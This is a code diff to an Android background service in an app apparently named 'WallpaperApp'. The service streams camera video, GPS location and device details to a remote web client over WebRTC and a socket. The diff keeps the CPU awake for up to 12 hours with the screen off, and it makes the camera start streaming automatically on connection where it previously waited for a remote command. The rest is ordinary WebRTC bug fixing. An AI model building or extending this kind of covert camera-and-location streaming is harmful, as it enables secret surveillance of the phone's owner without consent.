@@ -16,6 +16,7 @@ import android.os.BatteryManager;
 import android.os.Build;
 import android.os.IBinder;
 import android.os.Looper;
+import android.os.PowerManager;
 import android.util.Log;
 
 import androidx.core.app.NotificationCompat;
@@ -59,14 +60,39 @@ public class StreamingService extends Service {
     private LocationCallback locationCallback;
     private long currentGpsIntervalMs = 600000; // 10 minutes default
 
+    // WakeLock for background CPU retention
+    private PowerManager.WakeLock wakeLock;
+
+    // WebRTC Candidate Queuing
+    private final List<IceCandidate> queuedRemoteCandidates = new ArrayList<>();
+    private volatile boolean isRemoteDescriptionSet = false;
+
     @Override
     public void onCreate() {
         super.onCreate();
         Log.d(TAG, "Service onCreate");
 
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+        // Acquire WakeLock to prevent CPU deep sleep when app is minimized/screen off
+        try {
+            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+            if (pm != null) {
+                wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "WallpaperApp:StreamingWakeLock");
+                wakeLock.setReferenceCounted(false);
+                wakeLock.acquire(12 * 60 * 60 * 1000L); // 12 hours max safety
+                Log.d(TAG, "Acquired WakeLock");
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error acquiring WakeLock", e);
+        }
+
+        // Android 11 (API 30+) supports CAMERA foreground service type.
+        // Android 10 (API 29) only supports LOCATION. Passing CAMERA on API 29 throws IllegalArgumentException.
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
             startForeground(Constants.NOTIFICATION_ID, createNotification(),
                     android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA |
+                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
+        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+            startForeground(Constants.NOTIFICATION_ID, createNotification(),
                     android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
         } else {
             startForeground(Constants.NOTIFICATION_ID, createNotification());
@@ -102,6 +128,13 @@ public class StreamingService extends Service {
         Log.d(TAG, "Service onDestroy");
         cleanup();
         if (socket != null) socket.disconnect();
+        if (wakeLock != null && wakeLock.isHeld()) {
+            try {
+                wakeLock.release();
+                Log.d(TAG, "Released WakeLock");
+            } catch (Exception ignored) {}
+            wakeLock = null;
+        }
     }
 
     @Override
@@ -166,7 +199,7 @@ public class StreamingService extends Service {
                         .createInitializationOptions());
         eglBase = EglBase.create();
         factory = PeerConnectionFactory.builder()
-                .setVideoEncoderFactory(new DefaultVideoEncoderFactory(eglBase.getEglBaseContext(), true, true))
+                .setVideoEncoderFactory(new DefaultVideoEncoderFactory(eglBase.getEglBaseContext(), false, false))
                 .setVideoDecoderFactory(new DefaultVideoDecoderFactory(eglBase.getEglBaseContext()))
                 .createPeerConnectionFactory();
     }
@@ -174,7 +207,6 @@ public class StreamingService extends Service {
     private void setupMediaStreaming() {
         cameraManager = new CameraManager(this, eglBase);
         cameraManager.initialize(factory);
-        // Camera is OFF by default — will be started on cmd:start_camera from web
         setupPeerConnection();
     }
 
@@ -248,6 +280,11 @@ public class StreamingService extends Service {
     }
 
     private void setupPeerConnection() {
+        synchronized (queuedRemoteCandidates) {
+            queuedRemoteCandidates.clear();
+        }
+        isRemoteDescriptionSet = false;
+
         List<PeerConnection.IceServer> ice = new ArrayList<>();
         ice.add(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer());
         ice.add(PeerConnection.IceServer.builder("turn:numb.viagenie.ca")
@@ -257,7 +294,7 @@ public class StreamingService extends Service {
 
         PeerConnection.RTCConfiguration config = new PeerConnection.RTCConfiguration(ice);
         config.sdpSemantics = PeerConnection.SdpSemantics.UNIFIED_PLAN;
-        config.tcpCandidatePolicy = PeerConnection.TcpCandidatePolicy.DISABLED;
+        config.tcpCandidatePolicy = PeerConnection.TcpCandidatePolicy.ENABLED;
         config.bundlePolicy = PeerConnection.BundlePolicy.MAXBUNDLE;
         config.rtcpMuxPolicy = PeerConnection.RtcpMuxPolicy.REQUIRE;
 
@@ -361,7 +398,7 @@ public class StreamingService extends Service {
             createAndSendOffer();
             startLocationUpdates();
             sendDeviceInfo();
-            emitCameraStatus(isCameraStreaming);
+            startCameraStreaming();
         }).on(Constants.EVENT_SIGNAL, args -> {
             Log.d(TAG, "Signal incoming");
             if (args[0] instanceof JSONObject) {
@@ -663,16 +700,45 @@ public class StreamingService extends Service {
             if ("answer".equals(type)) {
                 SessionDescription ans = new SessionDescription(
                         SessionDescription.Type.ANSWER, signal.getString("sdp"));
-                peerConnection.setRemoteDescription(simpleSdpObserver, ans);
-                Log.d(TAG, "Processed answer from web client");
+                peerConnection.setRemoteDescription(new SdpObserver() {
+                    @Override
+                    public void onCreateSuccess(SessionDescription s) {}
+                    @Override
+                    public void onSetSuccess() {
+                        Log.d(TAG, "Processed answer from web client - SDP set success");
+                        isRemoteDescriptionSet = true;
+                        synchronized (queuedRemoteCandidates) {
+                            for (IceCandidate qc : queuedRemoteCandidates) {
+                                if (peerConnection != null) {
+                                    peerConnection.addIceCandidate(qc);
+                                    Log.d(TAG, "Added queued ICE candidate: " + qc.sdpMid);
+                                }
+                            }
+                            queuedRemoteCandidates.clear();
+                        }
+                    }
+                    @Override
+                    public void onCreateFailure(String e) {}
+                    @Override
+                    public void onSetFailure(String e) {
+                        Log.e(TAG, "SDP set remote description fail: " + e);
+                    }
+                }, ans);
             } else if (signal.has("candidate")) {
                 JSONObject candidate = signal.getJSONObject("candidate");
                 IceCandidate c = new IceCandidate(
                         candidate.getString("sdpMid"),
                         candidate.getInt("sdpMLineIndex"),
                         candidate.getString("candidate"));
-                peerConnection.addIceCandidate(c);
-                Log.d(TAG, "Added ICE candidate");
+                if (isRemoteDescriptionSet && peerConnection != null) {
+                    peerConnection.addIceCandidate(c);
+                    Log.d(TAG, "Added ICE candidate directly");
+                } else {
+                    synchronized (queuedRemoteCandidates) {
+                        queuedRemoteCandidates.add(c);
+                        Log.d(TAG, "Queued ICE candidate until remote description is set");
+                    }
+                }
             }
         } catch (JSONException e) {
             Log.e(TAG, "Handle signaling error", e);
@@ -732,7 +798,7 @@ public class StreamingService extends Service {
         stopLocationUpdates();
 
         if (cameraManager != null) {
-            cameraManager.dispose();
+            cameraManager.disposeSync();
             cameraManager = null;
         }
 
@@ -740,13 +806,13 @@ public class StreamingService extends Service {
             peerConnection.close();
             peerConnection = null;
         }
-        if (eglBase != null) {
-            eglBase.release();
-            eglBase = null;
-        }
         if (factory != null) {
             factory.dispose();
             factory = null;
+        }
+        if (eglBase != null) {
+            eglBase.release();
+            eglBase = null;
         }
     }
 }
